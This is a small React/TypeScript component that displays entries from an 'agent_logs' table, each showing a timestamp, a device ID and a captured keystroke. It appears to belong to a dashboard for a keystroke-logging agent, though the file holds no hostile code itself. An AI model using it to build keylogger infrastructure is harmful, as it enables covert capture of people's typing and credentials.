import { format } from "date-fns"
import { cn } from "@/lib/utils"
import type { Database } from "@/lib/database.types"

type Log = Database["public"]["Tables"]["agent_logs"]["Row"]

interface LogItemProps {
  log: Log
  isNew?: boolean
}

export function LogItem({ log, isNew = false }: LogItemProps) {
  const formattedDate = format(new Date(log.created_at), "yyyy-MM-dd HH:mm:ss")

  return (
    <div className={cn("rounded-md border p-3 transition-all", isNew && "animate-highlight")}>
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2">
          <span className="text-xs font-medium text-muted-foreground">{formattedDate}</span>
          <span className="rounded-full bg-secondary px-2 py-0.5 text-xs font-medium">{log.device_id}</span>
        </div>
      </div>
      <div className="mt-1 font-mono text-sm">{log.keystroke}</div>
    </div>
  )
}
